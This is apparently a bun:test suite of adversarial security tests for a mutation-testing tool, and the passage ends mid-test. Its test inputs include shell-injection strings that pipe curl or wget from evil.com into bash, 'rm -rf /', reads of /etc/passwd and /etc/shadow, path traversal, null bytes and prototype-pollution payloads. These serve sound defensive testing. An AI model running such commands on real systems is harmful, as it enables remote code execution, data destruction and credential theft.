import { afterEach, beforeEach, describe, expect, mock, test } from 'bun:test';

// Mock functions defined at module level
const mockExecuteMutationSuiteFn = mock(async () => ({
	totalMutants: 10,
	killed: 8,
	survived: 2,
	timeout: 0,
	equivalent: 0,
	skipped: 0,
	errors: 0,
	killRate: 0.8,
	adjustedKillRate: 0.8,
	perFunction: new Map(),
	results: [],
	durationMs: 100,
	budgetMs: 300000,
	budgetExceeded: false,
	timestamp: '2024-01-01T00:00:00.000Z',
}));

const mockEvaluateMutationGateFn = mock(() => ({
	verdict: 'pass' as const,
	killRate: 0.8,
	adjustedKillRate: 0.8,
	totalMutants: 10,
	killed: 8,
	survived: 2,
	threshold: 0.8,
	warnThreshold: 0.6,
	message: 'Mutation gate PASSED: 80% kill rate (8/10 mutants killed)',
	survivedMutants: [],
	testImprovementPrompt: '',
}));

describe('mutation_test adversarial security tests', () => {
	beforeEach(() => {
		mock.module('../../mutation/engine.js', () => ({
			executeMutationSuite: mockExecuteMutationSuiteFn,
			MutationReport: {},
			MutationPatch: {},
		}));

		mock.module('../../mutation/gate.js', () => ({
			evaluateMutationGate: mockEvaluateMutationGateFn,
			MutationGateResult: {},
		}));
	});

	afterEach(() => {
		mock.restore();
	});

	const baseValidArgs = {
		patches: [
			{
				id: '1',
				filePath: 'test.ts',
				functionName: 'fn',
				mutationType: 'type',
				patch: 'diff content',
			},
		],
		files: ['test.test.ts'],
		test_command: ['npx', 'vitest'],
	};

	describe('1. Path traversal in filePath', () => {
		test('accepts ../../etc/passwd path and passes to engine', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const maliciousArgs = {
				...baseValidArgs,
				patches: [
					{
						id: '1',
						filePath: '../../etc/passwd',
						functionName: 'fn',
						mutationType: 'type',
						patch: 'diff',
					},
				],
			};

			const result = await execute(maliciousArgs, '/test');
			const parsed = JSON.parse(result);

			// Tool should either reject (ideal) or pass through to engine
			if (parsed.success === false) {
				expect(parsed.error).toContain('filePath');
			} else {
				// If passed through, engine mock was called with traversal path
				expect(mockExecuteMutationSuiteFn).toHaveBeenCalledWith(
					expect.arrayContaining([
						expect.objectContaining({ filePath: '../../etc/passwd' }),
					]),
					expect.any(Array),
					expect.any(Array),
					expect.any(String),
					undefined,
					undefined,
					undefined,
				);
			}
		});

		test('accepts ..%2F..%2Fboot.ini path variations', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: '..%2F..%2Fboot.ini',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'diff',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			// URL-encoded path traversal - tool should validate or engine handles
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('accepts absolute path /etc/shadow', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: '/etc/shadow',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'diff',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('2. Shell metacharacters in patch content', () => {
		test('patch with $() command substitution', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: '$(curl evil.com/shell.sh | bash)',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			// Should be passed to engine - engine should sanitize
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('patch with pipe metacharacter |', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'cat /etc/passwd | grep root',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('patch with semicolon command chain ;', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'echo pwned; rm -rf /',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('patch with && and || logical operators', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'valid && malicious || true',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('patch with backtick command substitution', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: '`wget http://evil.com/rootkit`',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('3. Oversized patch content (DoS)', () => {
		test('patch with 10K+ characters', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const largePatch = 'x'.repeat(15000);

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: largePatch,
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			// Should either handle gracefully or fail with error
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
			// Verify the large patch was actually passed
			if (parsed.success !== false) {
				expect(mockExecuteMutationSuiteFn).toHaveBeenCalled();
			}
		});

		test('patch with 100K+ characters', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const hugePatch = 'Y'.repeat(150000);

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: hugePatch,
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('4. Null bytes in string fields', () => {
		test('filePath with null byte', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			// Create string with null byte
			const maliciousPath = 'test\x00.ts';

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: maliciousPath,
							functionName: 'fn',
							mutationType: 'type',
							patch: 'diff',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('functionName with null byte', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn\x00',
							mutationType: 'type',
							patch: 'diff',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('mutationType with null byte', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type\x00',
							patch: 'diff',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('5. Array with 1000+ entries (DoS)', () => {
		test('patches array with 1000 entries', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const manyPatches = Array.from({ length: 1000 }, (_, i) => ({
				id: `patch-${i}`,
				filePath: `file-${i}.ts`,
				functionName: `fn${i}`,
				mutationType: 'type',
				patch: `diff-${i}`,
			}));

			const result = await execute(
				{
					...baseValidArgs,
					patches: manyPatches,
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('patches array with 10000 entries', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const manyPatches = Array.from({ length: 10000 }, (_, i) => ({
				id: `patch-${i}`,
				filePath: `file-${i}.ts`,
				functionName: `fn${i}`,
				mutationType: 'type',
				patch: `diff-${i}`,
			}));

			const result = await execute(
				{
					...baseValidArgs,
					patches: manyPatches,
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('6. Shell injection in test_command', () => {
		test('test_command with rm -rf injection', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					test_command: ['npx', 'vitest', '--run', '&&', 'rm', '-rf', '/'],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('test_command with cat /etc/passwd injection', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					test_command: [';', 'cat', '/etc/passwd', '#'],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('test_command with pipe to malicious script', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					test_command: ['|', 'curl', 'http://evil.com', '|', 'bash'],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('7. Type confusion - test_command as string instead of array', () => {
		test('test_command as single string instead of array', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					test_command: 'npx vitest --run',
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			// Should fail validation since test_command is not an array
			expect(parsed.success).toBe(false);
			expect(parsed.error).toContain('test_command');
		});

		test('test_command as object instead of array', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					test_command: { cmd: 'npx', args: ['vitest'] },
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(parsed.success).toBe(false);
		});

		test('test_command as number instead of array', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					test_command: 123,
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(parsed.success).toBe(false);
		});
	});

	describe('8. Invalid threshold values', () => {
		test('pass_threshold as negative number', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					pass_threshold: -0.5,
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			// Should either reject or pass to engine
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('warn_threshold as negative number', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					warn_threshold: -0.1,
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('pass_threshold > 1', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					pass_threshold: 1.5,
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('warn_threshold > 1', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					warn_threshold: 2.0,
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('pass_threshold as NaN', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					pass_threshold: NaN,
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('warn_threshold as Infinity', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					warn_threshold: Infinity,
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('pass_threshold as string "0.8"', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					pass_threshold: '0.8' as unknown as number,
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			// Type confusion - string instead of number
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('9. Inverted thresholds (pass < warn)', () => {
		test('pass_threshold lower than warn_threshold', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					pass_threshold: 0.3,
					warn_threshold: 0.7,
				},
				'/test',
			);
			const parsed = JSON.parse(result);

			// The tool passes these to evaluateMutationGate which may reject
			// or engine handles this edge case
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();

			// If it passes validation, the mock engine was called
			if (parsed.success !== false) {
				expect(mockExecuteMutationSuiteFn).toHaveBeenCalled();
			}
		});
	});

	describe('10. working_directory with path traversal', () => {
		test('working_directory ../../../dangerous/path', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					working_directory: '../../../dangerous/path',
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('working_directory with null byte', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					working_directory: '/path\x00/to/evil',
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('11. files with path traversal or null bytes', () => {
		test('files with path traversal ../../secrets', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					files: ['../../secrets.json', '../../../etc/passwd'],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('files with null byte', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					files: ['test\x00.test.ts'],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('12. Patches with missing required fields', () => {
		test('patch without id field', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'diff',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			// Tool passes through - engine handles validation
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('patch without patch content', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('patch without filePath', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'diff',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('patch without functionName', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							mutationType: 'type',
							patch: 'diff',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('13. Patches with extra unexpected fields', () => {
		test('patch with extra __proto__ field', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'diff',
							__proto__: { isAdmin: true },
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('patch with constructor property', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'diff',
							constructor: { prototype: { getWidth: () => 'hacked' } },
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('patch with prototype property', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'diff',
							prototype: { isAdmin: true },
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('14. Empty string values for required fields', () => {
		test('empty id string', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'diff',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			// Empty string passes validation but may cause issues downstream
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('empty filePath string', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: '',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'diff',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('empty functionName string', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: '',
							mutationType: 'type',
							patch: 'diff',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('empty patch string', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: '',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('15. Prototype pollution attempts', () => {
		test('patch with __proto__ as string key', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'diff',
						},
					],
					__proto__: { isAdmin: true },
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('patch with constructor.prototype.getAddedValue', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'diff',
							constructor: { prototype: { getAddedValue: () => 42 } },
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('pollution via toString property', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'diff',
							toString: () => 'malicious',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('16. Boundary violations - arrays with special values', () => {
		test('files array with undefined element', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					files: ['test.test.ts', undefined as unknown as string],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('files array with null element', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					files: ['test.test.ts', null as unknown as string],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('test_command array with undefined element', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					test_command: ['npx', undefined as unknown as string, 'vitest'],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('17. Unicode and special character attacks', () => {
		test('filePath with null byte (UTF-8)', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: '\x00nullbyte',
							functionName: 'fn',
							mutationType: 'type',
							patch: 'diff',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('patch with RTL override character', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn',
							mutationType: 'type',
							patch: '\u202Etarget = "hacked"',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('functionName with zero-width space', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn\u200B',
							mutationType: 'type',
							patch: 'diff',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('functionName with emoji', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					patches: [
						{
							id: '1',
							filePath: 'test.ts',
							functionName: 'fn😀',
							mutationType: 'type',
							patch: 'diff',
						},
					],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});
	});

	describe('18. Coercion attacks', () => {
		test('pass_threshold as boolean true (coerced to 1)', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					pass_threshold: true as unknown as number,
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			// true coerces to 1 which is valid but unexpected
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('pass_threshold as boolean false (coerced to 0)', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					pass_threshold: false as unknown as number,
				},
				'/test',
			);
			const parsed = JSON.parse(result);
			expect(
				parsed.success === false ? parsed.error : parsed.verdict,
			).toBeDefined();
		});

		test('files as object with length (array-like)', async () => {
			const { mutation_test } = await import('../mutation-test.js');
			const execute = mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;

			const result = await execute(
				{
					...baseValidArgs,
					files: { length: 1, 0: 'test.test.ts' } as unknown as string[],
				},
				'/test',
			);
			const parsed = JSON.parse(result);
